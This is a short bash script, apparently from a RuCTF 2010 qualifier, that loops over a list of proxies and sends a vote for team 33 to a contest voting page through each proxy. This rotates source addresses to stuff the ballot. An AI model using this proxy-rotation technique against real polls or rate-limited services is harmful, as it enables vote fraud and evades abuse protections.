#! /bin/bash
for i in `cat proxys2.txt`
do
    curl --max-time 60 -d team=33 -H "Proxy-tion: close" -x $i http://voteme.quals2010.ructf.org/
done
